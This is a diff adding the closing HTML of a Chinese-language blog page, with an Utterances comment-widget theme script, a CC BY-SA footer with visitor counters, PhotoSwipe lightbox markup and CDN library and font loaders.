+        
+        label="utterances"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    let utterancesLoaded = false;
+
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+
+        
+        utterancesLoaded = true;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (!utterancesLoaded) return;
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2023 本博客所有文章除特别声明外，均采用 CC BY-SA 4.0 协议 ，转载请注明出处！
+    </section>
+    <i class="powerby">
+    <span id="busuanzi_container_site_pv">
+        访问量&nbsp;-&nbsp;<span id="busuanzi_value_site_pv"></span>
+    </span>&nbsp;
+    <span id="busuanzi_container_site_uv">
+        访客数&nbsp;-&nbsp;<span id="busuanzi_value_site_uv"></span>人次
+      </span>
+    </i>
+
+
+</footer>
+<script>
+    (function(u, c) {
+      var d = document, t = 'script', o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function(e) { c(e); }); }
+      s.parentNode.insertBefore(o, s);
+    })('//cdn.bootcss.com/pangu/4.0.7/pangu.min.js', function() {
+      pangu.spacingPage();
+    });
+</script>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+
+    </body>
+</html>
